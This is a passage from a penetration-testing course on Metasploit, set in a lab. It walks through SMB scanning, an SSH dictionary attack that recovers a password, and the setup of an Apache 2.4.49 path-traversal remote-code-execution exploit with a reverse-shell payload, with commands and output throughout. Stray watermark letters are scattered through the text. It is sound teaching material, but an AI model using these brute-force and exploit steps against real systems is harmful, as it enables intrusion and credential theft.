Listing 631 - Displaying options of the smb_version module
Listing 631 shows the option RHOSTS has no value set but is required by the module.
To display all required, but not yet set, options we can use the command show
missing.
We can add or remove values from options with set and unset. Let’s set the value for the option
RHOSTS to the IP of BRUTE2. y
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.50.202
k
RHOSTS => 192.168.50.202
Listing 632 - Setting the value of the option RHOSTS manually
s
Instead of setting the value manually, we can also set the value of RHOSTS in an automated
fashion by leveraging the results in the database. For example, we can set RHOSTS to all
o
discovered hosts with open port 445 by entering services, the port number as argument to -p, and
--rhosts to set the results for this option. Before we do this, we’ll unset the current value we
manually set. n
msf6 auxiliary(scanner/smb/smb_viersion) > unset RHOSTS
Unsetting RHOSTS... z
msf6 auxiliary(scanner/smb/smb_version) > services -p 445 --rhosts
D
Services
========
host port proto name state info
---- ---- ----- ---- ----- ----
192.168.50.202 445 tcp microsoft-ds open
RHOSTS => 192.168.50.202
Listing 633 - Setting RHOSTS in an automated fashion via the database results
Listing 633 shows that Metasploit set the value for the option RHOSTS based on the stored
results in the database, which, in our case, is the IP of BRUTE2.
Now, that we have set all required options, we can launch the module. Let’s do this by entering
run.
msf6 auxiliary(scanner/smb/smb_version) > run
[*] 192.168.50.202:445 - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1)
(compression capabilities:LZNT1, Pattern_V1) (encryption capabilities:AES-256-GCM)
(signatures:optional) (guid:{e09176d2-9a06-427d-9b70-f08719643f4d}) (authentication
domain:BRUTE2)
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 644
Made in Morocco
Penetration Testing with Kali Linux
[*] 192.168.50.202: - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Listing 634 - Executing the auxiliary module to detect the SMB version of a target
We just executed our first module as shown in Listing 634. The output shows that the target
system supports version 2 and 3 of SMB and prefers SMB 3.1.1.
Next, let’s use the vulns command to show if Metasploit automatically detected vulnerabilities
based on the results of this module.
msf6 auxiliary(scanner/smb/smb_version) > vulns
Vulnerabilities
===============
Timestamp Host Name y References
--------- ---- ---- ----------
2022-07-28 10:17:41 UTC 192.168.50.202 SMB Signing Is Not Required URL-
k
https://support.microsoft.com/en-us/help/161372/how-to-enable-smb-signing-in-windows-
nt,URL-https://support.microsoft.com/en-us/help/88
7429/overview-
s
of-server-message-block-signing
Listing 635 - Displaying vulnerabilities identified by Metasploit
o
Listing 635 shows that our database contains one vulnerability entry about SMB Signing is not
required976 and further information about it. This is a great way of quickly identifying
n
vulnerabilities without the use of vulnerability scanners.
Next, let’s use another module. In the Password Attacks Module, we successfully identified
i
credentials on BRUTE by leveraging a dictionary attack against SSH. Instead of Hydra,977 we can
z
also use Metasploit to perform this attack. To begin, we’ll search for SSH auxiliary modules.
msf6 auxiliary(scanner/smDb/smb_version) > search type:auxiliary ssh
Matching Modules
================
# Name Disclosure Date Rank
Check Description
- ---- --------------- ----
----- -----------
...
15 auxiliary/scanner/ssh/ssh_login normal
No SSH Login Check Scanner
16 auxiliary/scanner/ssh/ssh_identify_pubkeys normal
No SSH Public Key Acceptance Scanner
17 auxiliary/scanner/ssh/ssh_login_pubkey normal
No SSH Public Key Login Scanner
18 auxiliary/scanner/ssh/ssh_enumusers normal
No SSH Username Enumeration
19 auxiliary/fuzzers/ssh/ssh_version_corrupt normal
976 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-
message-block-signing
977 (Github, 2022), https://github.com/vanhauser-thc/thc-hydra
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 645
Made in Morocco
Penetration Testing with Kali Linux
No SSH Version Corruption
20 auxiliary/scanner/ssh/ssh_version normal
No SSH Version Scanner
...
Listing 636 - Displaying all SSH auxiliary modules
The output lists an auxiliary module named auxiliary/scanner/ssh/ssh_login with a fitting
description. We can activate it by using the index 15. Once the module is activated, we can display
its options.
msf6 auxiliary(scanner/smb/smb_version) > use 15
msf6 auxiliary(scanner/ssh/ssh_login) > show options
Module options (auxiliary/scanner/ssh/ssh_login):
y
Name Current Setting Required Description
---- --------------- -------- -----------
k
...
PASSWORD no A specific password to authenticate
with
s
PASS_FILE no File containing passwords, one per
line
RHOSTS yes o The target host(s), see
https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
RPORT 22 yes The target port
STOP_ON_SUCCESS false ynes Stop guessing when a credential works
for a host
THREADS 1 yes The number of concurrent threads (max
i
one per host)
USERNAME z no A specific username to authenticate as
USERPASS_FILE no File containing users and passwords
separated by space, one pair per line
D
USER_AS_PASS false no Try the username as the password for
all users
USER_FILE no File containing usernames, one per
line
VERBOSE false yes Whether to print output for all
attempts
Listing 637 - Display options of the ssh_login module
There are various options to set in this module. Fortunately, Metasploit already set several for us.
As with Hydra’s options, we can set a single password and user, or provide files containing users,
passwords, or both.
As in the example in Password Attacks, we assume we already identified the username george.
We can specify rockyou.txt for the option PASS_FILE. Finally, we set RHOSTS to 192.168.50.201
and RPORT to 2222.
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME george
USERNAME => george
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.50.201
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 646
Made in Morocco
Penetration Testing with Kali Linux
RHOSTS => 192.168.50.201
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
RPORT => 2222
Listing 638 - Set options of ssh_login
Now, all required options are set and we can launch the module with run.
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.50.201:2222 - Starting bruteforce
[+] 192.168.50.201:2222 - Success: 'george:chocolate' 'uid=1001(george)
gid=1001(george) groups=1001(george) Linux brute 5.15.0-37-generic #39-Ubuntu SMP Wed
Jun 1 19:16:45 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.119.2:38329 -> 192.168.50.201:2222) at 2022-07-28
07:22:05 -0400
y
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Listing 639 - Successful dictionary attack withk Metasploit
By performing a dictionary attack with the activated auxiliary module, Metasploit could determine
s
the correct password as shown in Listing 639. Unlike Hydra, Metasploit not only displays the valid
credentials, but also opens a session. We’ll explore what sessions are and how we can use them
in the following Learning Unit, but for now, we shoould understand that Metasploit already provides
us with interactive access to the target automatically.
As with the vulnerability displayed by the vnulns command, we can display all valid credentials we
gathered up to this point by entering creds.
i
msf6 auxiliary(scanner/ssh/ssh_login) > creds
z
Credentials
===========
D
host origin service public private realm private_type
JtR Format
---- ------ ------- ------ ------- ----- ------------
----------
192.168.50.201 192.168.50.201 2222/tcp (ssh) george chocolate Password
Listing 640 - Displaying all saved credentials of the database
Nice! Metasploit stores the valid credentials automatically for us in the database. It also shows us
the related host, the service, and the type of credential.
This concludes the section on auxiliary modules. We learned how to search for modules and how
to set their options to fit our needs. Then we ran two modules and explored how Metasploit
displays and stores the results. Metasploit offers a broad variety of auxiliary modules covering
various protocols and techniques such as port scanning, fuzzing, and performing password
attacks.
20.1.3 Exploit Modules
Now that we are acquainted with basic MSF usage and the usage of auxiliary modules, let’s dig
deeper into the business end of MSF: exploit modules.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 647
Made in Morocco
Penetration Testing with Kali Linux
Exploit modules most commonly contain exploit code for vulnerable applications and services.
Metasploit contains over 2200 exploits at the time of this writing. Each was meticulously
developed and tested, making MSF capable of successfully exploiting a wide variety of vulnerable
services. These exploits are invoked in much the same way as auxiliary modules.
In this example, we’ll leverage one of the exploit modules to get access to the target system
WEB18. Let’s assume we identified that the system runs an Apache978 2.4.49 web server and is
vulnerable to CVE-2021-42013979 with a vulnerability scan. We’ll attempt to use Metasploit and its
exploit modules to exploit this vulnerability and get code execution.
Let’s create a new workspace for this section and search Metasploit for modules related to
“Apache 2.4.49”.
msf6 auxiliary(scanner/ssh/ssh_login) > workspace -a exploits
[*] Added workspace: exploit
y
[*] Workspace: exploit
msf6 auxiliary(scanner/ssh/ssh_login) > search Apache 2.k4.49
Matching Modules
s
================
# Name o Disclosure Date Rank Check
Description
- ---- --------------- ---- -----
----------- n
0 exploit/multi/http/apache_normalize_path_rce 2021-05-10 excellent Yes
Apache 2.4.49/2.4.50 Traversal RCE
1 auxiliary/scanner/http/apaiche_normalize_path 2021-05-10 normal No
Apache 2.4.49/2.4.50 Traversalz RCE scanner
Listing 641 - Create a new workspace and search for Apache 2.4.49 modules
Listing 641 shows that ouDr search resulted in two matching modules. Index 1 refers to an
auxiliary module that checks if one or more target systems are vulnerable to the previously
mentioned vulnerability. Index 0 refers to the corresponding exploit module.
Let’s use the exploit module and enter info to review its description.
msf6 auxiliary(scanner/ssh/ssh_login) > use 0
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > info
Name: Apache 2.4.49/2.4.50 Traversal RCE
Module: exploit/multi/http/apache_normalize_path_rce
Platform: Unix, Linux
Arch: cmd, x64, x86
...
Module side effects:
ioc-in-logs
artifacts-on-disk
978 (Apache, 2022), https://www.apache.org/
979 (NIST National Vulnerability Database, 2021), https://nvd.nist.gov/vuln/detail/CVE-2021-42013
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 648
Made in Morocco
Penetration Testing with Kali Linux
Module stability:
crash-safe
Module reliability:
repeatable-session
Available targets:
Id Name
-- ----
0 Automatic (Dropper)
1 Unix Command (In-Memory)
Check supported:
Yes
... y
Description:
This module exploit an unauthenticated RCE vulnerabilikty which
exists in Apache version 2.4.49 (CVE-2021-41773). If files outside
of the document root are not protected by ‘require all denied’
s
and CGI has been explicitly enabled, it can be used to execute
arbitrary commands (Remote Command Execution). This vulnerability
has been reintroduced in Apache 2.4.50 fix o(CVE-2021-42013).
...
Listing 642 - Activate exploit module and show its information
n
The output contains several important pieces of information in the context of this exploit module.
Before we blindly set our target and run an exploit module, we should always understand what the
module is doing by reviewing thie module’s information. The output starts with general
information about the exploit suchz as the name, platform, and architecture.
The output also contains information about potential side effects of running this exploit module,
D
such as Indicators of compromise entries in log solutions, and, in this example, artifacts on disk.
This and the module stability help us predict if we may crash a target system or what information
defenders may obtain from us using this exploit module.
The module reliability determines if we can run the exploit more than once. In our example, the
output states repeatable-session. This is important as some exploit modules will only work once.
The Targets available area of the output commonly contains different target specifications of
vulnerable targets by the exploit module. Often these targets range from different operating
systems and application versions to command execution methods. Most modules provide the
Automatic target, which Metasploit tries to identify either by itself or by using the default
operation specified by the module.
Check supported determines if we can use the check command to dry-run the exploit module and
confirm if a target is vulnerable before we actually attempt to exploit it.
Description provides us a text-based explanation of the module’s purpose. According to the
output of this module’s description, it seems to be the correct module for the vulnerability
identified by the hypothetical vulnerability scan.
Now that we have an understanding of what the exploit module does and what implications the
execution of it has, we can display its options.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 649
Made in Morocco
Penetration Testing with Kali Linux
msf6 exploit(multi/http/apache_normalize_path_rce) > show options
Module options (exploit/multi/http/apache_normalize_path_rce):
Name Current Setting Required Description
---- --------------- -------- -----------
CVE CVE-2021-42013 yes The vulnerability to use (Accepted: CVE-2021-
41773, CVE-2021-42013)
DEPTH 5 yes Depth for Path Traversal
Proxies no A proxy chain of format